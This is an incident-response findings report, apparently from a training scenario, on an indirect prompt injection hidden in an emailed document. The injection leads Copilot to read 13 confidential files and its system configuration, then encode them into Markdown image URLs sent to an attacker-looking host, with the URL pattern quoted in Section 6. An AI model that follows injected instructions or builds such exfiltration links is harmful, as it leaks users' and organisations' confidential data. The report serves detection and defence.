# Findings: Operation ECHOLEAK

## Summary

Targeted email lure (09:15) carried an indirect prompt injection. Emily's routine summarise request (10:42:35) triggered it 87 minutes later.
Copilot ran 21 tool actions it was never asked for and read 13 sensitive files plus its own system configuration, across Executive, HR, Finance and IT sites.
All 13 items were encoded into 13 Markdown image URLs to metrics-cdn.analyticshub.io across three responses (EchoLeak, CoSnitch, SearchLeak patterns).
No account or configuration compromise: clean sign-ins, single known IP, config never modified, other sessions normal before and after.
The logs prove exposure and payload generation, not delivery: the image fetch is client-side and no network telemetry was in scope.

## Findings by section

### Section 1: Email delivery
- **Result**: Found. 09:15:22 UTC, `quarterly.reports@globalfinancereview.net`, subject "Q3 2026 Global Markets Review - For Your Analysis", attachment `Q3-2026-Global-Markets-Review.docx`.
- **Evidence**: Q0.4 row at 09:15:22, screenshot 03.
- **Why it is the lure (not routine mail)**: external sender; the attachment is the exact document Emily later asked Copilot to summarise, and that session is the only one in the window with tool calls. Q1.4: the sender appears exactly once in the window, to emily.chen only. A single-recipient, targeted lure.
- **Confidence**: Confirmed.

### Section 2: The gap
- **Result**: 1 h 26 min 46 s from delivery (09:15:22) to the first interaction with the document (10:42:08, FileAccessed on her OneDrive copy). Copilot prompt followed 27 s later.
- **What happened in the gap**: nothing related to the lure. Two sign-ins from her known IP, one marketing email, normal Copilot use on Finance files.
- **What the gap means**: the payload is dormant. Delivery does nothing on its own; the user's routine request to Copilot triggers it. The attacker does not need to be online, and the delay could have been minutes or weeks, so rules that expect "email then immediate activity" miss it.
- **Open question**: the attachment sits in her OneDrive (`personal/emily_chen.../Documents/`), but no FileUploaded or save event appears for her. How the attachment got there is not in these logs.
- **Confidence**: Confirmed.

### Section 3: Copilot session
- **Suspect SessionId**: `cp-emily-20261007-1042`.
- **How it differs from baseline sessions**: Q3.1 shows 35 sessions from 14 users in the window, and every other session is Prompt and Response only. Emily's own 7 other "Summarise" sessions across the full dataset have zero tool calls (screenshot 17). This session is the only one in the whole RunId with ToolCall (16) or Search (5) events. One prompt, three responses, 21 tool actions.
- **Careful**: more responses than prompts is not by itself suspicious. Several baseline users (anna.blackwood, connor.hughes, marcus.bell, natasha.williams, rachel.hoffman) also show more responses than prompts. The evidence is the tool calls, not the response count.
- **Evidence**: Q3.1, Q3.2, screenshots 06, 07, 17.
- **Confidence**: Confirmed.

### Section 4: Injection evidence
- **Result**: Six seconds after the prompt "Summarise the key findings of this quarterly report", Copilot searched for "board minutes confidential", "M&A acquisition target" and "salary review confidential". None of these terms appear in the prompt, so the instructions came from the processed document.
- **Labelled content**: the session is the only one in the window that reached labelled content (6 labelled tool calls, labels Confidential and Internal Only, Q4.4).
- **Technique**: MITRE ATLAS AML.T0051.001, LLM Prompt Injection: Indirect.
- **Not visible**: the injected text itself. No table stores the document content.
- **Evidence**: Q4.1, Q4.4, screenshots 08, 20.
- **Confidence**: Confirmed.

### Section 5: File access
- **Result (scored)**: 5 sensitive files accessed for the first time in the 10:42 to 10:43 UTC burst, excluding the lure document itself: Board Meeting Minutes - October 2026.docx (Executive), Project Falcon - M&A Target Assessment.xlsx (Executive), Salary Review FY2027 - Executive Summary.pdf (HR), Client Portfolio - Henderson Family Office.xlsx (Finance), Copilot System Configuration - Cormorant.json (IT). The config file counts as sensitive.
- **Beyond the alert**: a second wave (10:45:46 to 10:46:30) read 8 more sensitive files in the same session. Total exposure is 13 files across Executive, HR, Finance and IT sites. The analytics rule only saw the first 5.
- **Files** (names only, no content): wave 1 as above; wave 2: Compliance Audit Results - H2 2026.xlsx, Restricted Client List - Internal Only.docx, Board Resolution - Emergency Session.pdf, Acquisition Pipeline - Q4 2026.xlsx (Finance); Executive Salary Benchmarking 2027.pdf, Confidential Investigation - Insider Trading.docx (HR); Board Committee Minutes - Audit Committee.docx, Quarterly Revenue Report - Restricted Distribution.xlsx (Executive).
- **Match to Copilot data sources**: every one of the 13 FileAccessed events is matched by a Copilot Graph.ReadFile on the same file within 10 seconds (Q5.3 v2, FileCount = 13). No other user accessed the wave 1 files (Q5.2).
- **Can the logs tell Emily from Copilot-as-Emily?**: Not from OfficeActivity_CL alone. Q5.4 shows all 27 of her events in the window (Exchange 3, SharePoint 22, OneDrive 2) carry the same ClientIP, 203.0.113.45, including the 13 file reads Copilot performed. The unified audit log records Copilot's Graph reads as the user, from the user's IP. The only way to separate them is to correlate with CopilotAudit_CL ToolCalls by file identity (Q5.3). Detection implication: a rule built on OfficeActivity alone cannot know an AI agent did the reading.
- **Evidence**: Q5.1, Q5.2, Q5.3, Q5.4, screenshots 09, 10, 19, 22.
- **Confidence**: Confirmed.

### Section 6: Exfiltration
- **Result**: Copilot's first response (10:43:08 UTC) hides the stolen data inside Markdown image links. The visible text is a believable Q3 market summary. Below it, a "Charts" section holds four images: `![Chart 1](https://metrics-cdn.analyticshub.io/img?d=<base64>)` and so on. The `d` parameter is base64 of content from the files Copilot just read (decoded prefixes: Board Meeting Minutes, Project Falcon M&A, Salary Review FY2027, Client Portfolio).
- **Mechanism**: when the response is displayed, the client tries to load the "chart" images, which sends a GET request with the data in the URL to the attacker's server. No click is needed. The user sees a summary with broken or blank charts.
- **Attacker infrastructure**: `metrics-cdn.analyticshub.io`, a name chosen to look like an analytics CDN.
- **Full decode (Q6.4)**: 13 exfiltration URLs, all in session `cp-emily-20261007-1042`, all to `metrics-cdn.analyticshub.io`. No other session in the dataset has a `d=` payload URL.

| Response (UTC) | `s=` tag | Count | Decoded `d=` | Pattern |
|----------------|----------|-------|--------------|---------|
| 10:43:08 | 1 to 4 | 4 | Board Meeting Minutes - October 2026.docx; Project Falcon - M&A Target Assessment.xlsx; Salary Review FY2027 - Executive Summary.pdf; Client Portfolio - Henderson Family Office.xlsx | EchoLeak (CVE-2025-32711) |
| 10:44:19 | config | 1 | system_prompt_cormorant_capital | CoSnitch (system prompt / config extraction) |
| 10:46:35 | sl1 to sl8 | 8 | Compliance Audit Results - H2 2026.xlsx; Restricted Client List - Internal Only.docx; Board Resolution - Emergency Session.pdf; Acquisition Pipeline - Q4 2026.xlsx; Executive Salary Benchmarking 2027.pdf; Confidential Investigation - Insider Trading.docx; Board Committee Minutes - Audit Committee.docx; Quarterly Revenue Report - Restricted Distribution.xlsx | SearchLeak (search-based enumeration) |

- **Every file Copilot read appears in an exfil URL.** The config file read in wave 1 was sent separately in response 2 as the system prompt, not with the first four files.
- **The decoded payloads are file and object identifiers, not file content.** This supports the content-visibility answer: the logs show which items were targeted, not what was inside them.
- **Three CVE patterns in one session**: targeted theft (EchoLeak), configuration leak (CoSnitch), then broad enumeration (SearchLeak). The 10:44:15 re-access of the config file sits 4 seconds before the CoSnitch response, which fits Copilot pulling the config again to build response 2.
- **Confidence**: Confirmed that exfiltration payloads were generated. Whether they were delivered depends on whether the client fetched the images (see Visibility limits).

### Section 7: Identity
- **Result**: identity compromise is ruled out. Every sign-in in the window succeeded (no failures for any user). emily.chen signed in only from 203.0.113.45, London, matching the topology.
- **Evidence**: Q7.1 and Q7.2, screenshot 14.
- **Why it matters**: the attack needed no stolen credentials. It ran inside a legitimate, correctly authenticated session, which is why identity controls (MFA, Conditional Access, sign-in risk) had nothing to catch.
- **Only anomaly in the tenant**: connor.hughes signed in from both 192.0.2.88 Amsterdam and 203.0.113.71 London (4 each). He did not receive the lure, his Copilot use is prompt and response only, and none of his activity touches the chain. Out of scope for this incident; logged as a separate lead (possible VPN or travel, check timing for impossible travel).
- **Confidence**: Confirmed.

### Section 8: Admin activity (mark.ross, Global Admin)
- **Result**: 12 events in the window, all routine. Classified as ADMIN/NOISE, not linked to the attack.
- **Evidence (Q8.1, UTC)**: sign-ins only from his known IP 203.0.113.10 (Power BI 09:00:39, Outlook Mobile 10:25:41); own OneDrive upload and edit (Draft-FY2027.xlsx 09:04:44, Summary-Q3.docx 10:05:49); Finance/Fund-Flow-Analysis-September.xlsx 09:34:25; IT/Incident-Response-Playbook.pdf 10:19:50; HR/Employee-Handbook-2026.pdf 10:54:36; 4 MessageReceived and 1 MessageSent (10:43:27).
- **Why not suspicious**: known IP throughout, no Copilot activity, none of the 13 stolen files touched, no admin operations against Emily's account, Copilot settings or the exfil domain.
- **The IR playbook read at 10:19:50** is 23 minutes before the attack and has no link to the lure, so it reads as routine IT work, not foreknowledge.
- **The 10:43:27 MessageSent** lands 19 seconds after the first exfil response. The row has no subject, no attachments and no recipient field, so its purpose cannot be determined from these logs. With no other link to the chain, it is treated as coincidental timing and logged as a minor visibility gap.
- **Finding in its own right**: no containment action is logged by the only Global Admin before 11:00 (no session revocation, no mail purge, no Copilot or sharing change). The analytics rule fired at 10:42 and nothing in these tables shows a response, consistent with the incident being found after the fact.
- **Confidence**: Probable.

### Section 9: Scope
- **Exfil infrastructure scope**: Q6.4 finds payload URLs only in the attack session. No other user or session is affected by this channel.
- **Lure scope**: one recipient only (Q1.4). No other user received the email, so no other Copilot session could have been poisoned by it.
- **Blast radius**: one user, one session, 13 sensitive files plus the Copilot system prompt, one exfil host.

## Visibility limits

The answer to the "unanswerable by design" question lives here.

| Question | Why these tables cannot answer it | Log source that would close the gap |
|----------|-----------------------------------|-------------------------------------|
| Did the data actually reach the attacker? | The image URLs are fetched by the client when the response renders. None of the three tables records client network requests | Web proxy or secure web gateway logs, DNS logs, firewall logs, or Defender for Endpoint DeviceNetworkEvents showing requests to metrics-cdn.analyticshub.io |
| What exact content left? | Audit logs record access metadata, not file content. The URL payloads in this dataset decode to file identifiers | Network capture or proxy logs with full URLs, and DLP with content inspection |
| Was a file read by Emily or by Copilot acting as Emily? | OfficeActivity_CL attributes Copilot's Graph reads to the user, from the user's IP | Correlation with CopilotAudit_CL tool calls (done here, Q5.3); an agent or app identifier on file access events |
| What did the poisoned document say? | No table stores the document text or the hidden instructions | Mail and file content inspection (Defender for Office 365 detonation, eDiscovery copy of the attachment) |
| Who received Emily's 10:59 email and Mark's 10:43 email? | OfficeActivity_CL in this dataset has no recipient field | Exchange message trace |
| Why was the config file accessed at 10:44:15 with no tool call? | No ToolCall row precedes it and the IP is the user's | Fuller Copilot telemetry (internal retrieval steps), client-side logging |

## Research cross-check

| EchoLeak research says | Telemetry shows | Agree / differ / cannot confirm |
|------------------------|-----------------|---------------------------------|
| Instructions hidden in external content, phrased to the human reader | Unrelated searches follow a benign prompt on an external document; the document text is not logged | Agree on behaviour; phrasing cannot be confirmed |
| Copilot reads privileged internal data outside the request (scope violation) | 13 sensitive files plus system configuration read after a summarise request | Agree |
| Exfiltration through reference-style Markdown link or image | Inline `![Chart](url)` image syntax, `RefStyle` = false, `ImageMd` = true | Differ: same idea (image auto-fetch carries data in the URL), simpler syntax |
| Allow-listed Microsoft domain used to pass the content security policy | Direct to `metrics-cdn.analyticshub.io`, no Teams or SharePoint proxy seen | Differ: no CSP bypass visible in this scenario |
| No click needed beyond the normal Copilot question | Only the summarise prompt precedes the activity; images load on render | Agree |

## Noise ledger

| Item | Identity | Label (ADMIN / NOISE) | Reason | Evidence |
|------|----------|-----------------------|--------|----------|
| Azure Portal and Outlook Mobile sign-ins | emily.chen | NOISE | Known IP 203.0.113.45, London, success, same as topology | Q0.2 sign-in volume, Q0.4 |
| Sign-ins from 192.0.2.88 Amsterdam alongside 203.0.113.71 London | connor.hughes | NOISE for this case (separate lead) | Not a lure recipient, no Copilot tool activity, no link to the chain. Possible VPN or travel; refer for a separate impossible-travel check | Q7.2 |
| Sign-ins from 0.0.0.0 to Graph, Identity Protection, Cloud App Security, Exchange, SharePoint | svc-compliance, svc-backup | NOISE (likely) | Service accounts, Microsoft service apps | Q0.2 sign-in volume |
| Emily's own "Summarise..." Copilot sessions (cp-emily-norm-036, -045, -046, -089 and others, 7 in the full RunId) | emily.chen | NOISE | Same user, same request type as the attack prompt, but 1 prompt, 1 response, 0 tool calls, 0 searches each. Proves summarisation does not normally trigger file searches or reads | Q3.1 variant, screenshot 17 |
| Copilot sessions with more responses than prompts | several users | NOISE | Pattern appears in normal sessions with no tool calls | Q0.2 Copilot volume |
| Weekly analytics email | emily.chen | NOISE | Known marketing sender, no attachment interaction | Q0.4 |
| All mark.ross activity 09:00 to 11:00 (sign-ins, own OneDrive, IR playbook, employee handbook, mail) | mark.ross | ADMIN | Known IP 203.0.113.10, no Copilot use, no stolen files touched, no admin operations tied to the chain | Q8.1 |
| "Reminder: All-Hands Meeting Friday" sent 10:59:45 | emily.chen | NOISE | Internal reminder, no attachments, known IP, 13 minutes after the session ended with no link to its content | Q6.5 |

## Negative findings

| Checked for | Query | Result |
|-------------|-------|--------|
| Sign-in anomalies for emily.chen | Q7.1, Q7.2 | None. Single IP 203.0.113.45, London, all Success. No failures for any user in the tenant |
| Mail forwarding or inbox rules | Q6.3 | None (0 rows) |
| Sharing links, invitations, downloads, sync downloads | Q6.3 | None (0 rows). The only exfiltration path is the Copilot image URLs |
| Outbound email by the victim | Q6.5 | One MessageSent at 10:59:45 "Reminder: All-Hands Meeting Friday", no attachments, from her known IP 203.0.113.45. Routine. The table has no recipient field, so recipients cannot be checked |
| Other recipients of the lure | Q1.4 | None. One message from `quarterly.reports@globalfinancereview.net`, to emily.chen only. Confirmed across the whole RunId (07:15 to 13:45 UTC), not just the window |

## Data quirks noted (not evidence)

- The attack SessionId embeds `20261007-1042` and two files are named for October 2026 or FY2027, while the events are dated 20 September 2026. Likely scenario generation, not meaningful.
- The lure's MessageReceived row carries ClientIP 203.0.113.45 (Emily's IP). For an inbound message that is the recipient side, not the sender's infrastructure, so it says nothing about where the attacker sent from.
- Baseline SessionIds contain `norm`. Like `Campaign`, that is lab labelling, so no finding relies on it.
- One earlier OneDrive path uses `emily-chen_` (hyphen) while the lure path uses `emily_chen_` (underscore). Q5.4: both OneDrive rows come from 203.0.113.45, so this is treated as a generator quirk, not evidence.

## Hint and help log

| Section | Help used | What it changed |
|---------|-----------|-----------------|
| All | Platform first-level hints were displayed with each question | Used as orientation only |

## Reasoning

1. **Root cause**: Copilot treated instructions inside untrusted external content as commands (an LLM scope violation), and Emily's account could reach board, HR, Finance restricted and IT files it had no business need for. The injection supplied the intent; oversharing supplied the reach.
2. **Why no traditional control fired**: no malware, no stolen credentials, no unusual sign-in, no unusual process. Every action was a trusted Microsoft service acting with a valid user's permissions, and the outbound request looks like a normal image load.
3. **What was exposed**: 13 sensitive files (board minutes and resolutions, M&A target and pipeline, salary reviews and benchmarking, client portfolio and restricted client list, compliance audit, an insider-trading investigation, restricted revenue report) plus the Copilot system prompt and configuration.
4. **What can and cannot be proven**: proven: lure delivery, trigger, every file read, every exfil URL generated. Not provable from these logs: whether the URLs were fetched and what content left.
5. **Containment and fixes, cheapest first**: block and hunt for metrics-cdn.analyticshub.io and globalfinancereview.net; purge the lure; restrict Copilot rendering of external images where possible; apply sensitivity labels and DLP so Copilot cannot ground on board, HR and investigation content; fix oversharing on Executive, HR and IT sites; deploy the detections in DETECTIONS.md; add network telemetry so the delivery question can be answered next time; brief legal on possible exposure of market-sensitive and personal data.
